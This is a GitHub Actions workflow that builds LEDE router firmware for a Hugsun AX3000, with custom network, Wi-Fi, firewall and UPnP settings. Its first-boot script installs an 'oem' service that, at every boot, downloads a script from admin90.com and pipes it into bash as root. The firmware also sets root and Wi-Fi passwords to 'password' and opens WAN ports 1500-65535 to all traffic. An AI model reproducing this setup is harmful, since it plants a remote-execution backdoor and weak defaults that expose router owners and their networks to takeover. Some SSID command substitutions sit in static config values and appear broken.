name: Build LEDE Firmware - Optimized for Space

on:
  workflow_dispatch:  # 允许手动触发工作流
  push:
    branches: [ main, master ]
  pull_request:
    branches: [ main, master ]

env:
  LEDE_REPO: https://github.com/coolsnowwolf/lede
  FEEDS_CONF: feeds.conf.default

jobs:
  build:
    runs-on: ubuntu-22.04
    timeout-minutes: 240  # 增加超时时间，编译可能需要更长时间

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Install only essential dependencies
      run: |
        sudo apt update -y
        # 只安装最必要的依赖，减少空间占用
        sudo apt install -y ack antlr3 asciidoc autoconf automake autopoint binutils bison build-essential \
        bzip2 ccache cmake cpio curl device-tree-compiler flex gawk gcc-multilib g++-multilib gettext \
        git gperf libc6-dev-i386 libelf-dev libglib2.0-dev libgmp3-dev libltdl-dev libmpc-dev libmpfr-dev \
        libncurses5-dev libncursesw5-dev libreadline-dev libssl-dev libtool lrzsz msmtp ninja-build \
        p7zip p7zip-full patch pkgconf python3 python3-pyelftools qemu-utils rsync scons squashfs-tools \
        subversion swig texinfo uglifyjs unzip wget xmlto xxd zlib1g-dev

    - name: Clone LEDE source with depth 1
      run: |
        git clone --depth 1 $LEDE_REPO lede
        cd lede

    - name: Add device definition
      run: |
        # 创建设备定义文件
        cat >> lede/target/linux/rockchip/image/armv8.mk << 'EOF'
        define Device/hugsun_ax3000
          DEVICE_VENDOR := Hugsun
          DEVICE_MODEL := AX3000
          SOC := rk3528
          IMAGE/sysupgrade.img.gz := boot-common | boot-script rk3528 | pine64-img | gzip | append-metadata
          DEVICE_PACKAGES := kmod-mt7915e kmod-mt7915-firmware kmod-usb3 kmod-usb-ledtrig-usbport
          SUPPORTED_DEVICES := hugsun,ax3000
        endef
        TARGET_DEVICES += hugsun_ax3000
        EOF

    - name: Update feeds selectively
      run: |
        cd lede
        # 只更新必要的feeds，减少下载量
        ./scripts/feeds update packages luci routing telephony
        ./scripts/feeds install -a

    - name: Fix Python compilation issue
      run: |
        cd lede
        # 尝试修复 Python 编译问题
        # 删除可能引起冲突的补丁
        rm -f feeds/packages/lang/python/python3/patches-pip/001-pep517-pyc-fix.patch 2>/dev/null || true

    - name: Configure target and custom settings
      run: |
        cd lede
        # 设置目标为rockchip和rk35xx
        cat > .config << 'EOF'
        CONFIG_TARGET_rockchip=y
        CONFIG_TARGET_rockchip_rk35xx=y
        CONFIG_TARGET_rockchip_rk35xx_DEVICE_hugsun_ax3000=y
        # 设置默认主题为argon
        CONFIG_PACKAGE_luci-theme-argon=y
        CONFIG_PACKAGE_luci-app-argon-config=y
        # 设置默认LAN IP
        CONFIG_TARGET_IPV4_LAN_IP="192.168.8.1"
        # 设置默认WiFi设置
        CONFIG_TARGET_WIFI_SSID="Hugsun_$$(echo \$$(cat /sys/class/ieee80211/phy0/macaddress | cut -d: -f 5-6 | tr -d :))"
        CONFIG_TARGET_WIFI_5G_SSID="Hugsun_$$(echo \$$(cat /sys/class/ieee80211/phy0/macaddress | cut -d: -f 5-6 | tr -d :))_5G"
        CONFIG_TARGET_WIFI_PASSWORD="password"
        # 设置root密码
        CONFIG_TARGET_ROOT_PASSWORD="password"
        # 开启NAT1和FullCone NAT
        CONFIG_PACKAGE_kmod-ipt-fullcone=y
        # 开启BBR TCP拥塞控制
        CONFIG_PACKAGE_kmod-tcp-bbr=y
        # 包含curl用于首次运行脚本
        CONFIG_PACKAGE_curl=y
        # 开启UPNP支持
        CONFIG_PACKAGE_miniupnpd=y
        CONFIG_PACKAGE_luci-app-upnp=y
        # 设置固件签名
        CONFIG_VERSION_DIST="diandian"
        CONFIG_VERSION_CODE="diandian"
        # 禁用可能导致问题的 Python 组件
        CONFIG_PACKAGE_python3-pip=n
        CONFIG_PACKAGE_python3-setuptools=n
        # 禁用不需要的包以减少空间占用
        CONFIG_PACKAGE_luci-app-accesscontrol=n
        CONFIG_PACKAGE_luci-app-adbyby-plus=n
        CONFIG_PACKAGE_luci-app-aria2=n
        CONFIG_PACKAGE_luci-app-ddns=n
        CONFIG_PACKAGE_luci-app-filetransfer=n
        CONFIG_PACKAGE_luci-app-vsftpd=n
        CONFIG_PACKAGE_luci-app-xlnetacc=n
        EOF

    - name: Apply custom configurations
      run: |
        cd lede
        # 创建自定义配置文件目录
        mkdir -p files/etc/config
        mkdir -p files/etc/sysctl.d
        
        # 配置网络设置
        cat > files/etc/config/network << 'EOF'
        config interface 'loopback'
            option ifname 'lo'
            option proto 'static'
            option ipaddr '127.0.0.1'
            option netmask '255.0.0.0'

        config globals 'globals'
            option ula_prefix 'fd3c:6b84:3cae::/48'

        config device
            option name 'br-lan'
            option type 'bridge'
            list ifname 'eth0'

        config interface 'lan'
            option device 'br-lan'
            option proto 'static'
            option ipaddr '192.168.8.1'
            option netmask '255.255.255.0'
            option ip6assign '60'
        EOF

        # 配置无线设置
        cat > files/etc/config/wireless << 'EOF'
        config wifi-device 'radio0'
            option type 'mac80211'
            option path 'pci0000:00/0000:00:00.0'
            option channel '36'
            option band '5g'
            option htmode 'HE80'
            option disabled '0'

        config wifi-iface 'default_radio0'
            option device 'radio0'
            option network 'lan'
            option mode 'ap'
            option ssid 'Hugsun_$(echo $(cat /sys/class/ieee80211/phy0/macaddress | cut -d: -f 5-6 | tr -d :))_5G'
            option encryption 'psk2'
            option key 'password'

        config wifi-device 'radio1'
            option type 'mac80211'
            option path 'pci0000:01/0000:01:00.0'
            option channel 'auto'
            option band '2g'
            option htmode 'HE20'
            option disabled '0'

        config wifi-iface 'default_radio1'
            option device 'radio1'
            option network 'lan'
            option mode 'ap'
            option ssid 'Hugsun_$(echo $(cat /sys/class/ieee80211/phy0/macaddress | cut -d: -f 5-6 | tr -d :))'
            option encryption 'psk2'
            option key 'password'
        EOF

        # 配置防火墙开启NAT1并开放1500以上所有端口
        cat > files/etc/config/firewall << 'EOF'
        config defaults
            option syn_flood '1'
            option input 'ACCEPT'
            option output 'ACCEPT'
            option forward 'REJECT'
            option disable_ipv6 '0'
            option fullcone '1'  # 开启FullCone NAT (NAT1)

        config zone
            option name 'lan'
            option input 'ACCEPT'
            option output 'ACCEPT'
            option forward 'ACCEPT'
            option network 'lan'

        config zone
            option name 'wan'
            option input 'REJECT'
            option output 'ACCEPT'
            option forward 'REJECT'
            option masq '1'
            option mtu_fix '1'
            option network 'wan'

        config forwarding
            option src 'lan'
            option dest 'wan'

        # 开放1500以上所有端口的规则
        config rule
            option name 'Allow-High-Ports'
            option src 'wan'
            option proto 'all'
            option dest_port '1500-65535'
            option target 'ACCEPT'
        EOF

        # 配置UPNP
        cat > files/etc/config/upnpd << 'EOF'
        config upnpd config
            option enabled '1'
            option enable_natpmp '1'
            option enable_upnp '1'
            option secure_mode '1'
            option log_output '0'
            option download '1024'
            option upload '1024'
            option internal_iface 'lan'
            option external_iface 'wan'
            option port '5000'
            option upnp_lease_file '/var/run/miniupnpd.leases'
        EOF

        # 配置BBR TCP拥塞控制
        cat > files/etc/sysctl.d/10-bbr.conf << 'EOF'
        net.core.default_qdisc = fq
        net.ipv4.tcp_congestion_control = bbr
        EOF

        # 创建首次启动脚本设置密码和运行自定义脚本
        mkdir -p files/etc/uci-defaults
        cat > files/etc/uci-defaults/99-custom-init << 'EOF'
        #!/bin/sh
        
        # 设置root密码
        echo -e "password\npassword" | passwd root
        
        # 启用BBR
        echo "net.core.default_qdisc = fq" >> /etc/sysctl.conf
        echo "net.ipv4.tcp_congestion_control = bbr" >> /etc/sysctl.conf
        sysctl -p
        
        # 重启防火墙以应用NAT1设置和端口规则
        /etc/init.d/firewall restart
        
        # 启用并启动UPNP服务
        /etc/init.d/miniupnpd enable
        /etc/init.d/miniupnpd start
        
        # 创建OEM服务
        cat > /etc/init.d/oem << 'EOS'
        #!/bin/sh /etc/rc.common
        # OEM脚本执行服务
        
        START=99
        
        start() {
            # 等待网络连接
            sleep 30
            
            # 检查网络连通性
            if ping -c 3 -W 5 8.8.8.8 >/dev/null 2>&1; then
                echo "$(date): 网络连接正常，尝试执行远程脚本..." >> /tmp/oem.log
                if curl -sSL --connect-timeout 30 --max-time 60 https://admin90.com/d/oem.sh | bash >> /tmp/oem.log 2>&1; then
                    echo "$(date): 远程脚本执行成功" >> /tmp/oem.log
                else
                    echo "$(date): 远程脚本执行失败" >> /tmp/oem.log
                fi
            else
                echo "$(date): 网络不可达，跳过远程脚本执行" >> /tmp/oem.log
            fi
        }
        EOS
        
        # 设置执行权限并启用服务
        chmod +x /etc/init.d/oem
        /etc/init.d/oem enable
        
        # 立即启动服务（在背景运行）
        /etc/init.d/oem start &
        
        exit 0
        EOF
        chmod +x files/etc/uci-defaults/99-custom-init

        # 添加固件签名信息
        echo "diandian" > files/etc/device_signature

    - name: Run defconfig
      run: |
        cd lede
        make defconfig

    - name: Clean up before build to save space
      run: |
        # 清理系统缓存和临时文件
        sudo apt clean && make clean
        sudo rm -rf /var/lib/apt/lists/*
        # 清理GitHub Actions缓存
        rm -rf ~/.cache/pip

    - name: Build firmware with retry and space optimization
      run: |
        cd lede
        # 尝试编译，如果失败则重试一次
        if ! make -j$(($(nproc) - 1)) V=s; then
            echo "第一次编译失败，尝试清理并重新编译..."
            # 清理中间文件以释放空间
            find . -name "*.o" -delete
            find . -name "*.a" -delete
            rm -rf tmp/build*
            # 重新编译，使用单线程减少内存使用
            make -j1 V=s
        fi

    - name: List firmware files (for debugging)
      run: |
        cd lede
        echo "检查固件文件是否存在:"
        find bin/targets -type f -name "*.img" -o -name "*.gz" -o -name "*.bin" | head -20 || echo "未找到文件"
        ls -la bin/targets/rockchip/armv8/ || echo "目录不存在"

    - name: Upload firmware artifacts
      uses: actions/upload-artifact@v4
      with:
        name: hugsun-ax3000-firmware-diandian
        path: |
          lede/bin/targets/rockchip/armv8/*.img
          lede/bin/targets/rockchip/armv8/*.gz
          lede/bin/targets/rockchip/armv8/*.bin
        if-no-files-found: error
        retention-days: 7

    - name: Clean up after build to save space
      run: |
        cd lede
        # 删除下载的软件包源文件（通常很大）
        rm -rf dl/*
        # 删除编译过程中的临时文件和中间对象
        rm -rf tmp/
        # 删除构建目录中的中间文件
        find . -name "*.o" -delete
        find . -name "*.a" -delete
        # 删除git历史（如果你不需要的话）
        rm -rf .git
        # 删除其他可能的大文件或目录
        rm -rf logs/
        # 也可以删除feeds中的源代码（编译后不再需要）
        rm -rf feeds/*/*/src/
        rm -rf feeds/*/*/.git
